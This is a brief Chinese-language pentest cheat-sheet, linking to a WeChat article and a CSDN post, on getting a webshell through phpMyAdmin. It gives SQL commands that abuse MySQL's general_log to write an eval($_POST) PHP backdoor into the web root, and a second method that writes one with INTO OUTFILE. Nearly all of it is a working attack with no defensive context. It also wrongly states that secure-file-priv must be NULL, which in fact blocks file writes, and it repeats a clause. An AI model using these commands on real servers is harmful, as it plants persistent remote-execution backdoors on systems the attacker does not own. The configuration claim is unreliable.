[phpmyadmin写shell](https://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247484470&idx=1&sn=b2f7b56028ddf701a903d981e58e324e) [2](https://blog.csdn.net/qq_40638006/article/details/122033546)

### phpMyadmin
方式1.登录到后台之后日志写shell
```shell
show global variables like "%genera%";    #查询general_log全局变量配置
set global general_log='on';             #开启生成日志
SET global general_log_file='C:/phpStudy/www/shell.php'; #设置日志存储路径
select "<?php eval($_POST['cmd']);?>";   #写入一句话
set global general_log='off';             #关闭general_log模式
```

方式2.

```shell
select "<?php @eval($_POST[yxcms]);?>" into outfile " C://phpstudy/www/info.php"
```
需要配置文件中 secure-file-priv 值为NULL, 且更改后需重启服务才生效且更改后需重启服务才生效
